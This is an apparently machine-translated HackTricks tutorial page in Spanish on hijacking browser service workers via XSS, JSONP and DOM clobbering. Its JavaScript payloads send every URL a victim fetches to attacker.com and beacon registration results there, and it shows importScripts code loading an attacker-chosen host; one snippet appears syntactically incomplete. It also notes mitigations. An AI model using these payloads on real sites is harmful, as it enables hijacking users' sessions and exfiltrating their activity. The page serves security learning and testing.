# Abusing Service Workers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Un **service worker** es un script ejecutado por tu navegador en segundo plano, separado de cualquier p치gina web, que permite caracter칤sticas que no requieren una p치gina web o interacci칩n del usuario, mejorando as칤 las capacidades de **procesamiento en segundo plano y fuera de l칤nea**. Se puede encontrar informaci칩n detallada sobre los service workers [aqu칤](https://developers.google.com/web/fundamentals/primers/service-workers). Al explotar service workers dentro de un dominio web vulnerable, los atacantes pueden tomar control sobre las interacciones de la v칤ctima con todas las p치ginas dentro de ese dominio.

### Checking for Existing Service Workers

Los service workers existentes se pueden verificar en la secci칩n de **Service Workers** de la pesta침a **Application** en **Developer Tools**. Otro m칠todo es visitar [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) para una vista m치s detallada.

### Push Notifications

Los **permisos de notificaci칩n push** impactan directamente en la capacidad de un **service worker** para comunicarse con el servidor sin interacci칩n directa del usuario. Si se niegan los permisos, se limita el potencial del service worker para representar una amenaza continua. Por el contrario, otorgar permisos aumenta los riesgos de seguridad al permitir la recepci칩n y ejecuci칩n de posibles exploits.

## Attack Creating a Service Worker

Para explotar esta vulnerabilidad necesitas encontrar:

* Una forma de **subir archivos JS arbitrarios** al servidor y un **XSS para cargar el service worker** del archivo JS subido.
* Una **solicitud JSONP vulnerable** donde puedas **manipular la salida (con c칩digo JS arbitrario)** y un **XSS** para **cargar el JSONP con una carga 칰til** que **cargar치 un service worker malicioso**.

En el siguiente ejemplo voy a presentar un c칩digo para **registrar un nuevo service worker** que escuchar치 el evento `fetch` y **enviar치 al servidor del atacante cada URL obtenida** (este es el c칩digo que necesitar칤as **subir** al **servidor** o cargar a trav칠s de una **respuesta JSONP vulnerable**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Y este es el c칩digo que **registrar치 el trabajador** (el c칩digo que deber칤as poder ejecutar abusando de un **XSS**). En este caso, se enviar치 una solicitud **GET** al servidor de los **atacantes** **notificando** si la **registraci칩n** del trabajador de servicio fue exitosa o no:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
En caso de abusar de un endpoint JSONP vulnerable, deber칤as poner el valor dentro de `var sw`. Por ejemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Hay un **C2** dedicado a la **explotaci칩n de Service Workers** llamado [**Shadow Workers**](https://shadow-workers.github.io) que ser치 muy 칰til para abusar de estas vulnerabilidades.

La **directiva de cach칠 de 24 horas** limita la vida de un **service worker (SW)** malicioso o comprometido a un m치ximo de 24 horas despu칠s de una correcci칩n de vulnerabilidad XSS, asumiendo el estado de cliente en l칤nea. Para minimizar la vulnerabilidad, los operadores del sitio pueden reducir el Tiempo de Vida (TTL) del script SW. Tambi칠n se aconseja a los desarrolladores crear un [**kill-switch para service workers**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) para una desactivaci칩n r치pida.

## Abusando de `importScripts` en un SW a trav칠s de DOM Clobbering

La funci칩n **`importScripts`** llamada desde un Service Worker puede **importar un script de un dominio diferente**. Si esta funci칩n se llama utilizando un **par치metro que un atacante podr칤a** modificar, podr칤a **importar un script JS de su dominio** y obtener XSS.

**Esto incluso elude las protecciones CSP.**

**Ejemplo de c칩digo vulnerable:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Con DOM Clobbering

Para m치s informaci칩n sobre qu칠 es DOM Clobbering, consulta:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si la URL/dominio que el SW est치 utilizando para llamar a **`importScripts`** est치 **dentro de un elemento HTML**, es **posible modificarlo a trav칠s de DOM Clobbering** para hacer que el SW **cargue un script de tu propio dominio**.

Para un ejemplo de esto, consulta el enlace de referencia.

## Referencias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repositorios de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
